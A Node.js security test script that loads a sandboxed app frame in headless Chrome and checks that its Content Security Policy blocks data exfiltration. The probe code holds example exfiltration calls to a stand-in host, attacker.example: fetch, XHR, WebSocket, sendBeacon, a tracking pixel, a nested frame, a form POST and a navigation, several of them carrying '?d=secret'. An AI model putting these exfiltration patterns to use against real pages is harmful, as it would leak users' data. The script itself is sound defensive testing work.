#!/usr/bin/env node
// m3-csp-drill.mjs — the adversarial live drill for the M3 per-frame CSP
// (`src/security/m3Csp.ts`, UI_AS_APPS_SPEC §G1a / TRUST_MODES_SPEC §6, R3-234).
//
// `src/security/m3Csp.test.ts` proves the POLICY is the one we meant to write and
// that the document and the hosting config carry it. Only a browser can prove the
// policy DOES anything, so this drives the real built `dist/m3.html` in real
// Chrome, framed exactly the way the host frames an M3 app (the R3-195 sandbox
// flags: `allow-scripts allow-downloads allow-pointer-lock`, empty `allow`), and
// attacks it from the inside.
//
//   npm run build          # dist/m3.html must exist
//   npm run drill:m3-csp   # needs Chrome + puppeteer-core (neither is a repo dep)
//
// Kept in the repo rather than run once and described in a PR, because the thing
// it protects is a policy string that any future CDN change can silently break
// (ways_of_working §3: the harness is reusable infrastructure).
//
// WHAT IT ASSERTS
//   blocked  — fetch / XHR / WebSocket / sendBeacon to an attacker origin
//   blocked  — <img> pixel exfil, nested-frame GET, native form POST
//   blocked  — the module CDN OUTSIDE its two allowlisted paths (path scoping)
//   allowed  — the bundler's own module origins, the frame's own origin, and the
//              SDK MessagePort (not CSP-governed — the control assertion)
//   OBSERVED, NOT BLOCKED — frame self-navigation. That is the booked
//              browser-parity residual (finding C1); the drill fails if it ever
//              starts claiming otherwise.
//
// The CORS header this server sends mirrors the prod Hosting config: the frame is
// an opaque origin, so it sends `Origin: null` and without `ACAO: *` every
// subresource dies on CORS before CSP is ever consulted — which reads exactly
// like a CSP failure and sent one earlier debugging pass down the wrong path.
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const DIST = process.argv[2] || join(dirname(fileURLToPath(import.meta.url)), '..', 'dist');
const PORT = Number(process.env.DRILL_PORT || 8791);
const M3_SANDBOX_FLAGS = 'allow-scripts allow-downloads allow-pointer-lock';

// puppeteer-core is deliberately NOT a repo dependency (it would ride along into
// every install for a drill almost nobody runs). Install it anywhere and point
// PUPPETEER_CORE at the module, or install it globally.
let puppeteer;
for (const spec of ['puppeteer-core', process.env.PUPPETEER_CORE].filter(Boolean)) {
  try {
    puppeteer = (await import(spec)).default;
    break;
  } catch {
    /* try the next */
  }
}
if (!puppeteer) {
  console.error(
    '❌ needs puppeteer-core. Either `npm i -g puppeteer-core`, or:\n' +
      '     mkdir -p /tmp/drv && cd /tmp/drv && npm i puppeteer-core\n' +
      '     PUPPETEER_CORE=/tmp/drv/node_modules/puppeteer-core/lib/puppeteer/puppeteer-core.js npm run drill:m3-csp',
  );
  process.exit(2);
}
const CHROME = process.env.CHROME_PATH || '/usr/bin/google-chrome';
if (!fs.existsSync(join(DIST, 'm3.html'))) {
  console.error(`❌ no ${join(DIST, 'm3.html')} — run \`npm run build\` first`);
  process.exit(2);
}

const m3 = fs.readFileSync(join(DIST, 'm3.html'), 'utf8');
/** `m3.html` verbatim + an inline reporter. Inline script is policy-permitted on
 *  purpose (parcel's import map needs `'unsafe-inline'`), so the attacks below
 *  run under the exact bytes production serves. */
const probeDoc = (body) =>
  m3.replace(
    '</body>',
    `<script>
const out = { violations: [], results: {} };
document.addEventListener('securitypolicyviolation', (e) =>
  out.violations.push({ directive: e.effectiveDirective || e.violatedDirective, blocked: e.blockedURI }));
const record = async (name, fn) => {
  try { out.results[name] = { ok: true, value: await fn() }; }
  catch (e) { out.results[name] = { ok: false, error: String((e && e.message) || e) }; }
};
window.addEventListener('message', async (ev) => {
  if (ev.data !== 'run') return;
  const port = ev.ports && ev.ports[0];
  ${body}
  await new Promise((r) => setTimeout(r, 600));
  window.parent.postMessage({ probe: out }, '*');
});
</script></body>`,
  );

const MAIN = `
  await record('fetchAttacker', () => fetch('https://attacker.example/x?d=secret').then((r) => r.status));
  await record('xhrAttacker', () => new Promise((res, rej) => {
    const x = new XMLHttpRequest();
    x.onerror = () => rej(new Error('blocked')); x.onload = () => res(x.status);
    x.open('GET', 'https://attacker.example/x'); x.send();
  }));
  await record('websocket', () => { new WebSocket('wss://attacker.example/'); return 'constructed'; });
  await record('beacon', () => navigator.sendBeacon('https://attacker.example/b', 'x'));
  await record('pixel', () => new Promise((res) => {
    const i = new Image();
    i.onload = () => res('loaded'); i.onerror = () => res('error');
    i.src = 'https://attacker.example/p.gif?d=secret';
    setTimeout(() => res('timeout'), 1500);
  }));
  await record('nestedFrame', () => {
    const fr = document.createElement('iframe');
    fr.src = 'https://attacker.example/n?d=secret'; document.body.appendChild(fr); return 'appended';
  });
  await record('fetchSelf', () => fetch('/index.html').then((r) => r.status));
  await record('fetchDepTree', () => fetch('https://sandpack-cdn-staging.blazingly.io/dep_tree/probe').then((r) => r.status));
  await record('fetchCdnRoot', () => fetch('https://sandpack-cdn-staging.blazingly.io/?d=secret').then((r) => r.status));
  out.results.entryScript = { loaded: performance.getEntriesByType('resource').some((r) => new URL(r.name).pathname.endsWith('.js')) };
  await record('messagePort', () => new Promise((res) => {
    if (!port) return res('no-port');
    port.onmessage = (m) => res('echo:' + m.data);
    port.postMessage('ping');
    setTimeout(() => res('no-reply'), 1000);
  }));
`;
const FORM = `
  const f = document.createElement('form');
  f.method = 'POST'; f.action = 'https://attacker.example/f'; f.target = '_self';
  document.body.appendChild(f); f.submit();
`;
const NAV = `location.href = 'https://attacker.example/?d=secret';`;

const docs = { main: MAIN, form: FORM, nav: NAV };
for (const [name, body] of Object.entries(docs)) fs.writeFileSync(join(DIST, `__drill_${name}.html`), probeDoc(body));

const parentHtml = (doc, flags, withPort) => `<!doctype html><meta charset=utf-8><body><script>
const f = document.createElement('iframe');
f.setAttribute('sandbox', ${JSON.stringify(`${M3_SANDBOX_FLAGS} ${flags}`.trim())});
f.setAttribute('allow', '');
f.src = '/__drill_${doc}.html';
f.onload = () => {
  window.__loads = (window.__loads || 0) + 1;
  ${
    withPort
      ? `const ch = new MessageChannel();
         ch.port1.onmessage = (m) => ch.port1.postMessage('pong:' + m.data);
         try { f.contentWindow.postMessage('run', '*', [ch.port2]); } catch (e) {}`
      : `try { f.contentWindow.postMessage('run', '*'); } catch (e) {}`
  }
};
window.addEventListener('message', (e) => { if (e.data && e.data.probe) window.__probe = e.data.probe; });
document.body.appendChild(f);
</script>`;

const server = http.createServer((req, res) => {
  const url = new URL(req.url, 'http://x');
  if (url.pathname === '/parent') {
    res.writeHead(200, { 'content-type': 'text/html' });
    return res.end(parentHtml(url.searchParams.get('doc'), url.searchParams.get('flags') || '', url.searchParams.get('port') === '1'));
  }
  const file = path.join(DIST, url.pathname.slice(1));
  if (!file.startsWith(DIST) || !fs.existsSync(file)) { res.writeHead(404); return res.end('nope'); }
  const ext = path.extname(file);
  res.writeHead(200, {
    'content-type': ext === '.js' ? 'text/javascript' : 'text/html',
    'access-control-allow-origin': '*',
  });
  res.end(fs.readFileSync(file));
});
await new Promise((r) => server.listen(PORT, '127.0.0.1', r));

const browser = await puppeteer.launch({ executablePath: CHROME, headless: 'new', args: ['--no-sandbox', '--disable-dev-shm-usage'] });
const run = async (doc, { flags = '', port = false, wait } = {}) => {
  const page = await browser.newPage();
  const requests = [];
  await page.setRequestInterception(true);
  page.on('request', (r) => { requests.push(r.url()); r.url().includes('attacker.example') ? r.abort() : r.continue(); });
  await page.goto(`http://127.0.0.1:${PORT}/parent?doc=${doc}&flags=${flags}&port=${port ? 1 : 0}`, { waitUntil: 'load' });
  try { await page.waitForFunction(wait, { timeout: 15000 }); } catch { /* nav drills never report back */ }
  const probe = await page.evaluate('window.__probe');
  const frames = page.frames().map((f) => f.url());
  await page.close();
  return { probe, frames, attackerRequests: requests.filter((u) => u.includes('attacker.example')) };
};

const main = await run('main', { port: true, wait: 'window.__probe !== undefined' });
const form = await run('form', { flags: 'allow-forms', wait: 'window.__probe !== undefined' });
const nav = await run('nav', { wait: 'window.__loads > 1 || window.__probe !== undefined' });
await browser.close();
server.close();
for (const name of Object.keys(docs)) fs.rmSync(join(DIST, `__drill_${name}.html`), { force: true });

const violated = (r, directive, needle) =>
  (r.probe?.violations ?? []).some((v) => v.directive === directive && v.blocked.includes(needle));
const results = main.probe?.results ?? {};
const checks = [
  ['fetch to an attacker origin is CSP-blocked', violated(main, 'connect-src', 'attacker.example/x?d=secret')],
  ['XHR to an attacker origin is CSP-blocked', violated(main, 'connect-src', 'attacker.example/x')],
  ['WebSocket to an attacker origin is CSP-blocked', violated(main, 'connect-src', 'wss://attacker.example')],
  ['sendBeacon to an attacker origin is CSP-blocked', violated(main, 'connect-src', 'attacker.example/b')],
  ['pixel exfil is CSP-blocked (img-src)', violated(main, 'img-src', 'attacker.example/p.gif')],
  ['nested-frame GET is CSP-blocked (frame-src)', violated(main, 'frame-src', 'attacker.example')],
  ['the module CDN is reachable ONLY on its allowlisted paths', violated(main, 'connect-src', 'blazingly.io/?d=secret')],
  ['native form POST is CSP-blocked (form-action, isolated from the sandbox flag)', violated(form, 'form-action', 'attacker.example/f')],
  ['no attacker request escaped the frame', main.attackerRequests.length === 0 && form.attackerRequests.length === 0],
  // Controls — an M3 app must still BOOT AND RUN.
  ["the frame's own origin stays fetchable ('self' resolves in an opaque origin)", results.fetchSelf?.value === 200],
  ['dependency resolution (/dep_tree/) is allowed', results.fetchDepTree?.ok === true],
  ["the bundler's entry module loads (script-src)", results.entryScript?.loaded === true],
  ['the SDK MessagePort is unaffected (not CSP-governed)', results.messagePort?.value === 'echo:pong:ping'],
  // The booked residual — asserted as OBSERVED, never as prevented.
  ['self-navigation is NOT blocked (booked residual, §G1a / C1)', nav.attackerRequests.length > 0],
];

let failed = 0;
for (const [label, ok] of checks) {
  if (!ok) failed++;
  console.log(`${ok ? '✅' : '❌'} ${label}`);
}
if (failed) {
  console.error(`\n${failed} check(s) failed. Raw:\n${JSON.stringify({ main, form, nav }, null, 2)}`);
  process.exit(1);
}
console.log(`\n✅ M3 CSP drill passed — ${checks.length} checks.`);
